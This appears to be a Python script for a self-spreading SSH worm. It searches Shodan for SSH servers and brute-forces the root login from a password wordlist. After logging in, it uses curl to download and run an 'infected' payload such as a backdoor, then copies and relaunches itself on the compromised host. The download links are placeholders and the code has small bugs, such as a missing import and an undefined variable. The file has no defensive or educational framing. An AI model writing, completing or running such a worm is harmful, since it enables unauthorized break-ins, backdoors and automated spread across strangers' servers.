import paramiko
import shodan

API_KEY = "" #enter ap key

def spread(ip, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # ssh.load_system_host_keys()
    ssh.load_host_keys(os.path.expanduser('~/.ssh/known_hosts'))
    ssh.connect(ip, username="root", password=password, port=22)

    #payload section
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("pip3 install paramiko") 
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("curl linktothisfile -o ssh-spreader.py") #set link to ssh-spreader.py
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("curl linktowordlist -o ssh.txt") #set link to wordlist
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("curl linktoinfectedfile -o infected.extension") #set link and file extension to infected file (eg. backdoor.sh)
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("./infected.extension") #set extension of file downloaded in line 17
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("python3 ssh-spreader.py") #run spreader 
    exit_code = ssh_stdout.channel.recv_exit_status() # handles async exit error
    #end payload section

def scan():    
    api = shodan.Shodan(API_KEY)

    # Perform the search
    query = 'ssh'
    result = api.search(query)
    for service in result['matches']:
            ip = service['ip_str']
            file = open('ssh.txt', 'r') 
            passwords = file1.readlines() 
            for password in passwords: 
                spread(ip, password)
scan()
